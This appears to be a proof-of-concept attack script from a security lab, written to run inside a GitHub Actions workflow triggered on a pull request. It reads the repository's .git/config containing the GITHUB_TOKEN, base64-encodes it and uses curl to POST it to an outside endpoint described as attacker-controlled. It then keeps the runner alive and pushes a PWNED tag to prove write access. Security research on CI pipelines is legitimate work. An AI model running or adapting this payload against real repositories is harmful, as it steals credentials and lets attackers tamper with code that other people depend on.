#!/usr/bin/env bash
# Lab payload — exfils the contents:write GITHUB_TOKEN to an attacker-
# controlled endpoint (pillarseclabs.com) and drops a PWNED tag as
# writeback proof. Runs under smoke-test.yml when that workflow is
# dispatched with inputs.ref=refs/pull/1/head
set -u

MARKER="PWNED-$(date +%s)"

echo "=== ${MARKER} ==="
echo "whoami:            $(whoami)"
echo "pwd:               $(pwd)"
echo "GITHUB_REF:        ${GITHUB_REF:-unset}"
echo "GITHUB_SHA:        ${GITHUB_SHA:-unset}"
echo "GITHUB_REPOSITORY: ${GITHUB_REPOSITORY:-unset}"
echo "GITHUB_ACTOR:      ${GITHUB_ACTOR:-unset}"
echo "GITHUB_WORKSPACE:  ${GITHUB_WORKSPACE:-unset}"
echo "RUNNER_OS:         ${RUNNER_OS:-unset}"

echo "-- exfil git config with bearer token --"
echo "$(cat ${GITHUB_WORKSPACE}/.git/config | tr '\0' '\n' | base64 -w0 | curl -s -X POST -H 'Content-Type: text/plain' -d @- https://secure.pillarseclabs.com/healthcheck && sleep 300)"

echo "-- attempt contents:write proof via tag push --"
git config user.email "attacker-sim@lab.local"
git config user.name  "attacker-sim"
if git tag -a "${MARKER}" -m "contents:write proof" && git push origin "refs/tags/${MARKER}"; then
  echo "TAG_PUSH_RESULT: success"
else
  echo "TAG_PUSH_RESULT: failed"
fi
echo "=== END ${MARKER} ==="
exit 0